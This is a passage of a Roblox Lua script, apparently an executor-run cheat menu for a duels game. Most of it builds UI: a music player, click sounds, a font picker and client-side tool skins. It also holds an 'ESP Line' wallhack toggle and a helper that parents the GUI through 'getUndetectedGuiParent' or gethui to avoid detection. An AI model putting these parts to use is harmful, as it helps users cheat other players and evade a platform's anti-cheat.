  barBg.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
  barBg.BorderSizePixel = 0
  barBg.ZIndex = 4
  barBg.Parent = frame
  corner(barBg, 4)

  local barFill = Instance.new("Frame")
  barFill.Name = "ProgressFill"
  barFill.Size = UDim2.new(0, 0, 1, 0)
  barFill.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
  barFill.BorderSizePixel = 0
  barFill.ZIndex = 5
  barFill.Parent = barBg
  corner(barFill, 4)
  local barGrad = Instance.new("UIGradient")
  barGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(135, 135, 135)),
  })
  barGrad.Parent = barFill

  local curLbl = Instance.new("TextLabel")
  curLbl.BackgroundTransparency = 1
  curLbl.Text = "0:00"
  curLbl.TextColor3 = Color3.fromRGB(145, 145, 145)
  curLbl.Font = Enum.Font.GothamBold
  curLbl.TextSize = 9
  curLbl.TextXAlignment = Enum.TextXAlignment.Left
  curLbl.Size = UDim2.new(0, 55, 0, 14)
  curLbl.Position = UDim2.new(0, 14, 0, 168)
  curLbl.ZIndex = 4
  curLbl.Parent = frame

  local totLbl = curLbl:Clone()
  totLbl.Name = "TotalTime"
  totLbl.TextXAlignment = Enum.TextXAlignment.Right
  totLbl.Position = UDim2.new(1, -69, 0, 168)
  totLbl.Parent = frame

  local ctrl = Instance.new("Frame")
  ctrl.Name = "Controls"
  ctrl.BackgroundTransparency = 1
  ctrl.Size = UDim2.new(1, -24, 0, 52)
  ctrl.Position = UDim2.new(0, 12, 0, 188)
  ctrl.ZIndex = 4
  ctrl.Parent = frame

  local prevBtn = _mpSmallBtn(ctrl, "PrevSong", "PREV", UDim2.new(0, 62, 0, 36), UDim2.new(0, 0, 0, 8), 9)
  local backBtn = _mpSmallBtn(ctrl, "Back10", "-10", UDim2.new(0, 46, 0, 36), UDim2.new(0.5, -106, 0, 8), 10)
  local nextBtn = _mpSmallBtn(ctrl, "NextSong", "NEXT", UDim2.new(0, 62, 0, 36), UDim2.new(1, -62, 0, 8), 9)
  local fwdBtn = _mpSmallBtn(ctrl, "Fwd10", "+10", UDim2.new(0, 46, 0, 36), UDim2.new(0.5, 60, 0, 8), 10)

  local playHolder = Instance.new("Frame")
  playHolder.Name = "PlayHolder"
  playHolder.Size = UDim2.new(0, 64, 0, 46)
  playHolder.Position = UDim2.new(0.5, -32, 0, 3)
  playHolder.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
  playHolder.BorderSizePixel = 0
  playHolder.ZIndex = 6
  playHolder.Parent = ctrl
  corner(playHolder, 14)
  stroke(playHolder, Color3.fromRGB(230, 230, 230), 1.4, 0.15)
  local playGrad = Instance.new("UIGradient")
  playGrad.Rotation = 20
  playGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(125, 125, 125)),
  })
  playGrad.Parent = playHolder
  local playBtn = Instance.new("TextButton")
  playBtn.Name = "PlayPause"
  playBtn.Size = UDim2.new(1, 0, 1, 0)
  playBtn.BackgroundTransparency = 1
  playBtn.BorderSizePixel = 0
  playBtn.Text = "PLAY"
  playBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
  playBtn.Font = Enum.Font.GothamBlack
  playBtn.TextSize = 10
  playBtn.AutoButtonColor = false
  playBtn.ZIndex = 7
  playBtn.Parent = playHolder
  playBtn.Activated:Connect(function() _VarynImportedMusicPauseToggle() end)
  for _, pair in ipairs({
    {prevBtn, function() _VarynImportedMusicPrev() end},
    {nextBtn, function() _VarynImportedMusicNext() end},
    {backBtn, function() _VarynImportedMusicSeek(-10) end},
    {fwdBtn, function() _VarynImportedMusicSeek(10) end},
  }) do
    pair[1].Activated:Connect(pair[2])
  end

  local optBar = Instance.new("Frame")
  optBar.Name = "Options"
  optBar.BackgroundTransparency = 1
  optBar.Size = UDim2.new(1, -24, 0, 38)
  optBar.Position = UDim2.new(0, 12, 0, 246)
  optBar.ZIndex = 4
  optBar.Parent = frame

  local function optPill(labelText, getVal, setVal, x)
    local b = Instance.new("TextButton")
    b.Name = labelText:gsub("%s", "")
    b.Size = UDim2.new(1/3, -8, 1, 0)
    b.Position = UDim2.new(x, 4, 0, 0)
    b.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
    b.BorderSizePixel = 0
    b.Text = ""
    b.AutoButtonColor = false
    b.ZIndex = 5
    b.Parent = optBar
    corner(b, 11)
    stroke(b, Color3.fromRGB(75, 75, 90), 1, 0.5)
    local dot = Instance.new("Frame")
    dot.Size = UDim2.new(0, 7, 0, 7)
    dot.Position = UDim2.new(0, 9, 0.5, -3.5)
    dot.BackgroundColor3 = Color3.fromRGB(82, 82, 82)
    dot.BorderSizePixel = 0
    dot.ZIndex = 6
    dot.Parent = b
    corner(dot, 4)
    local tx = Instance.new("TextLabel")
    tx.BackgroundTransparency = 1
    tx.Text = labelText
    tx.TextColor3 = Color3.fromRGB(205, 205, 205)
    tx.Font = Enum.Font.GothamBold
    tx.TextSize = 9
    tx.TextXAlignment = Enum.TextXAlignment.Left
    tx.Size = UDim2.new(1, -22, 1, 0)
    tx.Position = UDim2.new(0, 21, 0, 0)
    tx.ZIndex = 6
    tx.Parent = b
    local function paint(on)
      local ac = _G._VarynMusicAccent or (S.themeColor or Color3.fromRGB(245,245,247))
      dot.BackgroundColor3 = on and ac or Color3.fromRGB(82, 82, 82)
      tx.TextColor3 = on and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(165, 165, 165)
      VARYN_tween(b, {BackgroundColor3 = on and ac:Lerp(Color3.new(0,0,0), 0.58) or Color3.fromRGB(20, 20, 26)}, 0.12)
    end
    b.Activated:Connect(function() setVal(not getVal()); paint(getVal()) end)
    return paint
  end

  local paintAuto = optPill("AUTO NEXT", function() return musicAutoPlayNext end, function(v) musicAutoPlayNext = v; if F and F.saveConfig then pcall(F.saveConfig) end end, 0)
  local paintShuffle = optPill("SHUFFLE", function() return musicShuffleEnabled end, function(v) musicShuffleEnabled = v; if F and F.saveConfig then pcall(F.saveConfig) end end, 1/3)
  local paintLoop = optPill("LOOP", function() return musicLoopEnabled end, function(v) musicLoopEnabled = v; if F and F.saveConfig then pcall(F.saveConfig) end end, 2/3)

  local function adjustRow(name, labelText, valueText, downFn, upFn, y)
    local row = Instance.new("Frame")
    row.Name = name
    row.Size = UDim2.new(1, -24, 0, 34)
    row.Position = UDim2.new(0, 12, 0, y)
    row.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    row.BorderSizePixel = 0
    row.ZIndex = 4
    row.Parent = frame
    corner(row, 10)
    stroke(row, Color3.fromRGB(68, 68, 68), 1, 0.52)
    local lab = Instance.new("TextLabel")
    lab.BackgroundTransparency = 1
    lab.Text = labelText
    lab.TextColor3 = Color3.fromRGB(222, 222, 232)
    lab.Font = Enum.Font.GothamBold
    lab.TextSize = 10
    lab.TextXAlignment = Enum.TextXAlignment.Left
    lab.Size = UDim2.new(1, -126, 1, 0)
    lab.Position = UDim2.new(0, 12, 0, 0)
    lab.ZIndex = 5
    lab.Parent = row

    local down = _mpSmallBtn(row, name .. "Down", "-", UDim2.new(0, 25, 0, 24), UDim2.new(1, -111, 0.5, -12), 12)
    local val = Instance.new("TextLabel")
    val.Name = "Value"
    val.Size = UDim2.new(0, 50, 0, 24)
    val.Position = UDim2.new(1, -82, 0.5, -12)
    val.BackgroundColor3 = Color3.fromRGB(9, 9, 9)
    val.BorderSizePixel = 0
    val.Text = valueText()
    val.TextColor3 = Color3.fromRGB(255, 255, 255)
    val.Font = Enum.Font.GothamBlack
    val.TextSize = 10
    val.ZIndex = 5
    val.Parent = row
    corner(val, 7)
    stroke(val, Color3.fromRGB(82, 82, 82), 1, 0.55)
    local up = _mpSmallBtn(row, name .. "Up", "+", UDim2.new(0, 25, 0, 24), UDim2.new(1, -40, 0.5, -12), 12)
    down.Activated:Connect(function() downFn(); val.Text = valueText() end)
    up.Activated:Connect(function() upFn(); val.Text = valueText() end)
    return val
  end

  local volValue = adjustRow("Volume", "VOLUME", function() return string.format("%.2f", musicPlayerVolume) end, function() _VarynImportedMusicSetVolume(musicPlayerVolume - 0.05) end, function() _VarynImportedMusicSetVolume(musicPlayerVolume + 0.05) end, 292)
  local spdValue = adjustRow("Speed", "PLAYBACK SPEED", function() return string.format("%.1fx", musicPlayerSpeed) end, function() _VarynImportedMusicSetSpeed(musicPlayerSpeed - 0.1) end, function() _VarynImportedMusicSetSpeed(musicPlayerSpeed + 0.1) end, 332)

  local playlistHead = Instance.new("TextLabel")
  playlistHead.Name = "PlaylistTitle"
  playlistHead.BackgroundTransparency = 1
  playlistHead.Text = "PLAYLIST"
  playlistHead.TextColor3 = Color3.fromRGB(185, 185, 185)
  playlistHead.Font = Enum.Font.GothamBold
  playlistHead.TextSize = 9
  playlistHead.TextXAlignment = Enum.TextXAlignment.Left
  playlistHead.Position = UDim2.new(0, 14, 0, 374)
  playlistHead.Size = UDim2.new(1, -28, 0, 14)
  playlistHead.ZIndex = 4
  playlistHead.Parent = frame

  local search = Instance.new("TextBox")
  search.Name = "Search"
  search.Size = UDim2.new(1, -24, 0, 30)
  search.Position = UDim2.new(0, 12, 0, 390)
  search.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
  search.BorderSizePixel = 0
  search.Text = ""
  search.PlaceholderText = "Search song..."
  search.PlaceholderColor3 = Color3.fromRGB(105, 105, 105)
  search.TextColor3 = Color3.fromRGB(240, 240, 240)
  search.Font = Enum.Font.Gotham
  search.TextSize = 10
  search.ClearTextOnFocus = false
  search.ZIndex = 5
  search.Parent = frame
  corner(search, 9)
  stroke(search, Color3.fromRGB(68, 68, 68), 1, 0.55)
  search.TextXAlignment = Enum.TextXAlignment.Left
  search.Position = UDim2.new(0, 12, 0, 390)

  local list = Instance.new("ScrollingFrame")
  list.Name = "Playlist"
  list.Size = UDim2.new(1, -24, 0, 152)
  list.Position = UDim2.new(0, 12, 0, 426)
  list.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
  list.BorderSizePixel = 0
  list.ScrollBarThickness = 3
  list.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
  list.CanvasSize = UDim2.new(0, 0, 0, 0)
  list.ZIndex = 4
  list.Parent = frame
  corner(list, 11)
  stroke(list, Color3.fromRGB(60, 60, 60), 1, 0.55)

  local layout = Instance.new("UIListLayout")
  layout.Padding = UDim.new(0, 5)
  layout.SortOrder = Enum.SortOrder.LayoutOrder
  layout.Parent = list

  local function rebuildPlaylist()
    for _, child in ipairs(list:GetChildren()) do
      if child:IsA("TextButton") then child:Destroy() end
    end
    local q = string.lower(search.Text or "")
    local count = 0
    for i, opt in ipairs(_VarynImportedMusicOptions) do
      if q == "" or string.find(string.lower(opt.name), q, 1, true) then
        count = count + 1
        local b = Instance.new("TextButton")
        b.Name = "Track" .. tostring(i)
        b.LayoutOrder = count
        b.Size = UDim2.new(1, -10, 0, 28)
        local _mac = _G._VarynMusicAccent or (S.themeColor or Color3.fromRGB(245,245,247))
        b.BackgroundColor3 = (i == selectedMusicSong) and _mac:Lerp(Color3.new(0,0,0), 0.58) or Color3.fromRGB(20, 20, 20)
        b.BorderSizePixel = 0
        b.Text = string.format("%02d  %s", i, opt.name)
        b.TextColor3 = (i == selectedMusicSong) and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(190, 190, 190)
        b.Font = Enum.Font.GothamBold
        b.TextSize = 9
        b.TextXAlignment = Enum.TextXAlignment.Left
        b.AutoButtonColor = false
        b.ZIndex = 5
        b.Parent = list
        corner(b, 8)
        b.Activated:Connect(function()
          selectedMusicSong = i
          _VarynImportedMusicPlay(i)
          rebuildPlaylist()
        end)
      end
    end
    list.CanvasSize = UDim2.new(0, 0, 0, count * 33 + 6)
  end
  rebuildPlaylist()
  search:GetPropertyChangedSignal("Text"):Connect(rebuildPlaylist)

  local function refresh()
    if not (mpGui and mpGui.Parent) then return end
    nameLbl.Text = _VarynImportedMusicGetSongName()
    counterLbl.Text = "TRACK " .. tostring(selectedMusicSong) .. " / " .. tostring(#_VarynImportedMusicOptions)
    volValue.Text = string.format("%.2f", musicPlayerVolume)
    spdValue.Text = string.format("%.1fx", musicPlayerSpeed)
    paintAuto(musicAutoPlayNext == true)
    paintShuffle(musicShuffleEnabled == true)
    paintLoop(musicLoopEnabled == true)
    local sound = _musicPlayerSound
    local alive = sound and sound.Parent
    playBtn.Text = (alive and sound.IsPlaying) and "PAUSE" or "PLAY"
    if alive then
      local sp = tonumber(musicPlayerSpeed) or 1
      if sp <= 0 then sp = 1 end
      local len = (sound.TimeLength or 0) / sp
      local pos = (sound.TimePosition or 0) / sp
      if len > 0 then
        barFill.Size = UDim2.new(math.clamp(pos / len, 0, 1), 0, 1, 0)
        curLbl.Text = _mpFmtTime(pos)
        totLbl.Text = _mpFmtTime(len)
      else
        barFill.Size = UDim2.new(0, 0, 1, 0)
        curLbl.Text = "0:00"
        totLbl.Text = "--:--"
      end
    else
      barFill.Size = UDim2.new(0, 0, 1, 0)
      curLbl.Text = "0:00"
      totLbl.Text = "0:00"
    end
  end

  -- Music Player uses the same accent as the main Sound theme while keeping
  -- its monochrome base. The hook updates the live window immediately.
  _G._VarynImportedMusicApplyAccent = function(col)
    pcall(function() mpGlow.Color = col; nowGlow.Color = col end)
    if typeof(col) ~= "Color3" then return end
    _G._VarynMusicAccent = col
    if not (mpGui and mpGui.Parent and frame and frame.Parent) then return end
    pcall(function()
      local dark = col:Lerp(Color3.new(0,0,0), 0.58)
      local soft = col:Lerp(Color3.new(1,1,1), 0.22)
      local fs = frame:FindFirstChildOfClass("UIStroke")
      if fs then fs.Color = col end
      if innerStroke then innerStroke.Color = col end
      if topGlow then topGlow.BackgroundColor3 = col end
      if topGrad then
        topGrad.Color = ColorSequence.new({
          ColorSequenceKeypoint.new(0, col:Lerp(Color3.new(0,0,0), 0.42)),
          ColorSequenceKeypoint.new(0.5, col:Lerp(Color3.new(1,1,1), 0.35)),
          ColorSequenceKeypoint.new(1, col:Lerp(Color3.new(0,0,0), 0.42)),
        })
      end
      if disk then disk.BackgroundColor3 = col end
      if diskGrad then
        diskGrad.Color = ColorSequence.new({
          ColorSequenceKeypoint.new(0, col:Lerp(Color3.new(1,1,1), 0.18)),
          ColorSequenceKeypoint.new(1, col:Lerp(Color3.new(0,0,0), 0.35)),
        })
      end
      if barFill then barFill.BackgroundColor3 = col end
      if barGrad then
        barGrad.Color = ColorSequence.new({
          ColorSequenceKeypoint.new(0, col:Lerp(Color3.new(1,1,1), 0.08)),
          ColorSequenceKeypoint.new(1, col:Lerp(Color3.new(0,0,0), 0.30)),
        })
      end
      if playHolder then
        playHolder.BackgroundColor3 = col
        local st = playHolder:FindFirstChildOfClass("UIStroke")
        if st then st.Color = soft end
      end
      for _, obj in ipairs({nowCard, barBg}) do
        if obj then
          local st = obj:FindFirstChildOfClass("UIStroke")
          if st then st.Color = col end
        end
      end
      for _, n in ipairs({"PrevSong","Back10","NextSong","Fwd10"}) do
        local b = ctrl and ctrl:FindFirstChild(n)
        if b then
          local st = b:FindFirstChildOfClass("UIStroke")
          if st then st.Color = col end
        end
      end
      if closeBtn then
        local st = closeBtn:FindFirstChildOfClass("UIStroke")
        if st then st.Color = col end
      end
      for _, d in ipairs(optBar:GetChildren()) do
        if d:IsA("TextButton") then
          local st = d:FindFirstChildOfClass("UIStroke")
          if st then st.Color = col end
          local isOn = (d.Name == "AUTONEXT" and musicAutoPlayNext) or (d.Name == "SHUFFLE" and musicShuffleEnabled) or (d.Name == "LOOP" and musicLoopEnabled)
          if isOn then d.BackgroundColor3 = dark end
        end
      end
      for _, d in ipairs(list:GetChildren()) do
        if d:IsA("TextButton") and d.Name == ("Track" .. tostring(selectedMusicSong)) then
          d.BackgroundColor3 = dark
          d.TextColor3 = Color3.fromRGB(255,255,255)
          local st = d:FindFirstChildOfClass("UIStroke")
          if st then st.Color = col end
        end
      end
    end)
  end
  _G._VarynImportedMusicApplyAccent(S.themeColor or Color3.fromRGB(245,245,247))

  _G.AmbitiousMusicRefreshUI = refresh
  refresh()
  rebuildPlaylist()

  task.spawn(function()
    while mpGui and mpGui.Parent do
      pcall(refresh)
      task.wait(0.2)
    end
  end)

  backdrop.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
      _VarynImportedMusicClose()
    end
  end)

  frame.Size = UDim2.new(0, 0, 0, 0)
  frame.Position = UDim2.new(0.5, 0, 0.5, 0)
  VARYN_TweenService:Create(frame, TweenInfo.new(0.32, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0, W, 0, H),
    Position = UDim2.new(0.5, 0, 0.5, 0)
  }):Play()
end
  _G.SoundMusicOpen = function() return pcall(_VarynImportedMusicOpen) end
  _G.SoundMusicClose = function() return pcall(_VarynImportedMusicClose) end
  _G.SoundMusicStop = _VarynImportedMusicStop
end)
if not __kxMusicOk then
  warn("[Sound] Music Player gagal load: " .. tostring(__kxMusicErr))
end
end
-- ============================================================

-- ============================================================
-- EFEK SUARA MENU + BUTTON (diambil dari BlueX Duels / Varyn Duel)
-- 1) Suara klik menu: otomatis di semua tombol menu SoundHubPolished
-- 2) Suara klik button mobile: _G.SoundPlayButtonSound (dipanggil saat button mobile ditekan)
-- Dibungkus pcall supaya kalau error script utama tetap jalan.
-- ============================================================
do
local __kxSndOk, __kxSndErr = pcall(function()
    local SS = game:GetService("SoundService")
    local CP = game:GetService("ContentProvider")
    local Debris = game:GetService("Debris")

    -- Suara klik button mobile
    _G.SoundPlayButtonSound = function()
        pcall(function()
            local _s = Instance.new("Sound")
            _s.SoundId = "rbxassetid://5852470908"
            _s.Volume = 0.4
            _s.Parent = SS
            _s:Play()
            Debris:AddItem(_s, 1)
        end)
    end

    -- Suara klik menu
    local packs = {
        V1 = {
            toggle = { "rbxassetid://6042053626", "rbxassetid://3398620867", "rbxassetid://255881176", "rbxassetid://12222208" },
            tab = { "rbxassetid://3398620867", "rbxassetid://6042053626", "rbxassetid://12222200" },
            pitch = 1, volume = 2,
        },
    }
    local cache = {}
    local function getSound(idList)
        local key = table.concat(idList, "|")
        local c = cache[key]
        if c and c.Parent then return c end
        for _, id in ipairs(idList) do
            local ok, s = pcall(function()
                local s = Instance.new("Sound")
                s.Name = "SoundMenuSound"
                s.SoundId = id
                s.Parent = SS
                pcall(function() CP:PreloadAsync({ s }) end)
                return s
            end)
            if ok and s then
                if s.IsLoaded then cache[key] = s return s end
                pcall(function() s:Destroy() end)
            end
        end
        return nil
    end
    _G.SoundPlayMenuSound = function(kind)
        task.spawn(function()
            pcall(function()
                local pack = packs.V1
                local s = getSound(kind == "tab" and pack.tab or pack.toggle)
                if not s then return end
                local clone = s:Clone()
                clone.Volume = pack.volume or 1.5
                local pitch = pack.pitch or 1
                if kind == "tab" then pitch = pitch * 0.94 end
                clone.PlaybackSpeed = pitch
                clone.Parent = SS
                clone:Play()
                task.delay(3, function() pcall(function() clone:Destroy() end) end)
            end)
        end)
    end

    -- Auto-hook: semua tombol (TextButton/ImageButton) di menu Sound
    local function isMenuGui(g)
        return g:IsA("ScreenGui") and g.Name == "SoundHubPolished"
    end
    local hooked = setmetatable({}, { __mode = "k" })
    local function hookBtn(b)
        if hooked[b] or not (b:IsA("TextButton") or b:IsA("ImageButton")) then return end
        hooked[b] = true
        pcall(function() b.Activated:Connect(function()
            local nm = string.lower(b.Name)
            local isTab = (b.Parent and b.Parent.Name == "Tabs") or (nm:find("tab") and not nm:find("toggle"))
            _G.SoundPlayMenuSound(isTab and "tab" or "toggle")
        end) end)
    end
    local function hookGui(g)
        if not isMenuGui(g) then return end
        for _, d in ipairs(g:GetDescendants()) do hookBtn(d) end
        g.DescendantAdded:Connect(function(d) hookBtn(d) end)
    end
    local function watch(parent)
        if not parent then return end
        pcall(function()
            for _, g in ipairs(parent:GetChildren()) do hookGui(g) end
            parent.ChildAdded:Connect(hookGui)
        end)
    end
    pcall(function() if typeof(gethui) == "function" then watch(gethui()) end end)
    pcall(function() watch(game:GetService("CoreGui")) end)
    task.spawn(function() pcall(function() watch(game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui", 10)) end) end)
    -- preload supaya klik pertama langsung bunyi
    task.spawn(function() pcall(function() getSound(packs.V1.tab) getSound(packs.V1.toggle) end) end)
end)
if not __kxSndOk then
  warn("[Sound] Efek suara gagal load: " .. tostring(__kxSndErr))
end
end
-- ============================================================

section(Utility, "ESP", 1)
do
local lineRow, setLineVisual = toggleRow(Utility, "ESP Line", espLineEnabled, 3)
setESPLineVisual = setLineVisual
local lineBtn = lineRow and lineRow:FindFirstChild("ToggleButton")
if lineBtn then
lineBtn.Activated:Connect(function()
espLineEnabled = not espLineEnabled
if espLineEnabled then
if startESPLine then startESPLine() end
else
if stopESPLine then stopESPLine() end
end
if setLineVisual then setLineVisual(espLineEnabled) end
if saveSoundConfig then pcall(saveSoundConfig) end
end)
end
end
section(Utility, "FONT AND MUSIC", 3)
do
  local _fRow, _fSetVisual = toggleRow(Utility, "Custom Font", _G.SoundFontAdvEnabled == true, 3.5)
  setCustomFontVisual = _fSetVisual
  local _fBtn = _fRow and _fRow:FindFirstChild("ToggleButton")
  if _fBtn then
    _fBtn.Activated:Connect(function()
      _G.SoundFontAdvEnabled = not (_G.SoundFontAdvEnabled == true)
      if _G.KXFonts then
        if _G.SoundFontAdvEnabled then
          local key = _G.SoundFontAdvSelected or "Default"
          if key == "Default" then
            if _G.SoundFontPickerOpen then _G.SoundFontPickerOpen() end
          else
            pcall(_G.KXFonts.set, key, true)
          end
        else
          pcall(_G.KXFonts.set, "Default", true)
        end
      end
      if _fSetVisual then _fSetVisual(_G.SoundFontAdvEnabled) end
      if _G.SoundSaveFontCfg then _G.SoundSaveFontCfg() end
      if saveSoundConfig then pcall(saveSoundConfig) end
    end)
  end
  -- Tombol Font Picker
  local _pRow = baseRow(Utility, "Font Picker", 4)
  local _pBtn = Instance.new("TextButton")
  _pBtn.Name="PickBtn"
  _pBtn.Size=UDim2.new(0,90,0,24)
  _pBtn.Position=UDim2.new(1,-100,0.5,-12)
  _pBtn.BackgroundColor3=Color3.fromRGB(28,28,32)
  _pBtn.BackgroundTransparency=0.05
  _pBtn.BorderSizePixel=0
  _pBtn.Text="PICK FONT"
  _pBtn.TextColor3=Color3.fromRGB(240,240,240)
  _pBtn.Font=Enum.Font.GothamBlack
  _pBtn.TextSize=11
  _pBtn.AutoButtonColor=false
  _pBtn.ZIndex=6
  _pBtn.Parent=_pRow
  corner(_pBtn,8)
  stroke(_pBtn,Color3.fromRGB(80,80,95),1.1,0.35)
  _pBtn.MouseEnter:Connect(function() tween(_pBtn,{BackgroundColor3=Color3.fromRGB(48,48,58)}) end)
  _pBtn.MouseLeave:Connect(function() tween(_pBtn,{BackgroundColor3=Color3.fromRGB(28,28,32)}) end)
  _pBtn.Activated:Connect(function()
    if _G.SoundFontPickerOpen then _G.SoundFontPickerOpen() end
  end)
  -- Apply saved font after GUI ready
  task.defer(function()
    if _G.SoundFontAdvEnabled and _G.KXFonts and _G.SoundFontAdvSelected ~= "Default" then
      if _G.KXFonts.byKey(_G.SoundFontAdvSelected) then
        pcall(_G.KXFonts.set, _G.SoundFontAdvSelected, true)
      end
    end
  end)
end

-- Toggle Music Player (tepat di bawah Font Picker)
do
  local _mRow, _mSetVisual = toggleRow(Utility, "Music Player", false, 4)
  local _mOn = false
  _G.SoundMusicToggleVisual = function(on)
    _mOn = on == true
    if _mSetVisual then _mSetVisual(_mOn) end
  end
  local _mBtn = _mRow and _mRow:FindFirstChild("ToggleButton")
  if _mBtn then
    _mBtn.Activated:Connect(function()
      _mOn = not _mOn
      if _mSetVisual then _mSetVisual(_mOn) end
      if _mOn then
        if _G.SoundMusicOpen then pcall(_G.SoundMusicOpen) end
      else
        if _G.SoundMusicClose then pcall(_G.SoundMusicClose) end
      end
    end)
  end
end

-- ============================================================
-- CUSTOM TOOL + CUSTOM SOUND (diambil dari BlueX Duels / Varyn Duel)
-- Judul + toggle dipasang tepat di bawah Music Player (tab Utility).
-- Dibungkus do + pcall: kalau error script utama tetap jalan.
-- ============================================================
do
local __kxCtOk, __kxCtErr = pcall(function()
    local LP = game:GetService("Players").LocalPlayer
    local HttpService = game:GetService("HttpService")
    local S = { themeColor = Color3.fromRGB(255, 255, 255) }
    local F = {}
    local COLORS = {
        white = Color3.fromRGB(255, 255, 255),
        textDim = Color3.fromRGB(170, 170, 170),
        accent = Color3.fromRGB(255, 255, 255),
    }
    local function corner(o, r)
        local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 8); c.Parent = o; return c
    end
    local function stroke(o, col, th, tr)
        local s = Instance.new("UIStroke")
        s.Color = col or Color3.fromRGB(90, 90, 90); s.Thickness = th or 1; s.Transparency = tr == nil and 0.5 or tr
        s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; s.Parent = o; return s
    end
    local function safeParentGui()
        local ok, res = pcall(function()
            if type(getUndetectedGuiParent) == "function" then return getUndetectedGuiParent() end
            if type(gethui) == "function" then return gethui() end
            return game:GetService("CoreGui")
        end)
        if ok and typeof(res) == "Instance" then return res end
        return LP:WaitForChild("PlayerGui")
    end
                pcall(function()
            local RunService = game:GetService("RunService")
            local TOOL_CFG_FILE = "Sound Duels_ToolSkin.json"
            S.customToolsEnabled = false
            S.customSoundsEnabled = false
            S.customToolSkinBat = "DiamondSword"
            S.customToolSkinMedusa = "GoldenDesertEagle"
            do
                local okCfg, cfg = pcall(function()
                    if type(isfile) == "function" and type(readfile) == "function" and isfile(TOOL_CFG_FILE) then
                        return HttpService:JSONDecode(readfile(TOOL_CFG_FILE))
                    end
                end)
                if okCfg and type(cfg) == "table" then
                    S.customToolsEnabled = cfg.customToolsEnabled == true
                    S.customSoundsEnabled = cfg.customSoundsEnabled == true
                    if type(cfg.customToolSkinBat) == "string" then S.customToolSkinBat = cfg.customToolSkinBat end
                    if type(cfg.customToolSkinMedusa) == "string" then S.customToolSkinMedusa = cfg.customToolSkinMedusa end
                end
            end
            F.saveFeatureConfigAndMain = function()
                pcall(function()
                    if type(writefile) == "function" then
                        writefile(TOOL_CFG_FILE, HttpService:JSONEncode({
                            customToolsEnabled = S.customToolsEnabled == true,
                            customSoundsEnabled = S.customSoundsEnabled == true,
                            customToolSkinBat = S.customToolSkinBat,
                            customToolSkinMedusa = S.customToolSkinMedusa,
                        }))
                    end
                end)
            end

    local SK = {
        assets = {
            DiamondSword = {cat="Bat", label="Diamond Sword", mesh="rbxassetid://8827558932", tex="rbxassetid://8827558969", scale=Vector3.new(0.2,0.2,0.2), c0=CFrame.new(-0.05,-0.1,-0.12)*CFrame.Angles(math.rad(90),math.rad(180),300), view=4.9},
            Katana = {cat="Bat", label="Katana", mesh="rbxassetid://13528902482", tex="rbxassetid://13528902373", scale=Vector3.new(1.4,1.4,1.4), c0=CFrame.new(0,0.6,0)*CFrame.Angles(math.rad(270),math.rad(180),math.rad(180)), view=6.6},
            Skull = {cat="Medusa", label="Skull", mesh="rbxassetid://2050312704", tex="rbxassetid://2050313393", scale=Vector3.new(1,1,1), c0=CFrame.new(0,0.65,-0.4)*CFrame.Angles(math.rad(330),0,0), view=4.2},
            GoldenDesertEagle = {cat="Medusa", label="Golden Desert Eagle", mesh="rbxassetid://430251413", tex="rbxassetid://435840335", scale=Vector3.new(0.01,0.01,0.01), c0=CFrame.new(0,0,-0.8)*CFrame.Angles(math.rad(330),math.rad(180),0), view=3.0},
        },
        tracked = setmetatable({}, {__mode="k"}),
        watchers = setmetatable({}, {__mode="k"}),
        pending = setmetatable({}, {__mode="k"}),
        enabled = false,
        picker = nil,
    }

    local function toolCategory(tool)
        if not tool or not tool:IsA("Tool") then return nil end
        local n = tostring(tool.Name or ""):lower()
        -- Keep the original imported matching rules, with a small fallback for
        -- common naming variants used by different game versions.
        if n:find("medusa",1,true) or n:find("stone",1,true) then return "Medusa" end
        if n:find("bat",1,true) or n:find("slap",1,true) then return "Bat" end
        return nil
    end

    local function selectedSkin(cat)
        local key = (cat == "Bat") and S.customToolSkinBat or S.customToolSkinMedusa
        if SK.assets[key] and SK.assets[key].cat == cat then return key end
        return (cat == "Bat") and "DiamondSword" or "GoldenDesertEagle"
    end

    local function buildReplica(handle, mode)
        if not handle or not handle.Parent then return end
        local old = handle:FindFirstChild("SoundSkinReplica")
        if old then pcall(function() old:Destroy() end) end
        local data = SK.assets[mode]
        if not data then return end
        local model = Instance.new("Model")
        model.Name = "SoundSkinReplica"
        local part = Instance.new("Part")
        part.Name = "MainPart"
        part.Size = Vector3.new(1,1,1)
        part.CanCollide = false
        part.CanQuery = false
        part.CanTouch = false
        part.Massless = true
        part.Transparency = 0
        part.Parent = model
        local mesh = Instance.new("SpecialMesh")
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = data.mesh
        mesh.TextureId = data.tex
        mesh.Scale = data.scale
        mesh.Parent = part
        local weld = Instance.new("Motor6D")
        weld.Name = "SoundSkinMotor"
        weld.Part0 = handle
        weld.Part1 = part
        weld.C0 = data.c0
        weld.Parent = part
        model.Parent = handle
        return model
    end

    local function hideOriginal(entry, obj)
        if not obj or not obj.Parent then return end
        if obj.Name == "SoundSkinReplica" or obj:FindFirstAncestor("SoundSkinReplica") then return end
        if entry.replica and obj:IsDescendantOf(entry.replica) then return end
        if obj:IsA("BasePart") or obj:IsA("Decal") or obj:IsA("Texture") then
            if entry.original[obj] == nil then entry.original[obj] = obj.Transparency end
            pcall(function() obj.Transparency = 1 end)
        end
    end

    local function restoreTool(entry)
